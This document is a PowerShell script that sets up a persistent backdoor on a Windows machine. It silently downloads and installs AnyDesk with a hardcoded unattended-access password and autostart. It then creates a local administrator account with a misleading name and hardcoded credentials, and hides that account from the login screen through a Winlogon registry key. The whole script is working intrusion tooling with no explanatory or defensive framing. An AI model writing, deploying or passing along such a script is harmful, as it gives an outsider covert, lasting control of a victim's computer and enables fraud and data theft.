# Must be run as Administrator

# ----------------- CONFIG -----------------
$installPath = "C:\ProgramData\AnyDesk"
$anydeskUrl = "http://download.anydesk.com/AnyDesk.exe"
$anydeskExe = "$installPath\AnyDesk.exe"
$password = "J9kzQ2Y0qO"

$adminUsername = "oldadministrator"
$adminPassword = "jsbehsid#Zyw4E3"
# -----------------------------------------

function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "Please run this script as Administrator." -ForegroundColor Red
        exit
    }
}

function Install-AnyDesk {
    Write-Host "`n📦 Installing AnyDesk..." -ForegroundColor Cyan

    # Create install path
    if (-not (Test-Path $installPath)) {
        New-Item -ItemType Directory -Path $installPath | Out-Null
    }

    # Download AnyDesk
    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskExe

    # Silent install
    Start-Process -FilePath $anydeskExe -ArgumentList "--install `"$installPath`" --start-with-win --silent" -Wait

    # Set password for unattended access
    Start-Process -FilePath $anydeskExe -ArgumentList "--set-password=$password" -Wait

    Write-Host "✅ AnyDesk installed and configured." -ForegroundColor Green
}

function Create-HiddenAdmin {
    Write-Host "`n👤 Creating hidden admin user..." -ForegroundColor Cyan

    # Create user
    net user $adminUsername $adminPassword /add
    net localgroup Administrators $adminUsername /add

    # Hide from login screen via registry
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    New-ItemProperty -Path $regPath -Name $adminUsername -PropertyType DWord -Value 0 -Force | Out-Null

    Write-Host "✅ Hidden admin user '$adminUsername' created." -ForegroundColor Green
}

# ------------------ EXECUTION ------------------
Ensure-Admin
Install-AnyDesk
Create-HiddenAdmin

Write-Host "`n🎉 All tasks completed successfully!" -ForegroundColor Green
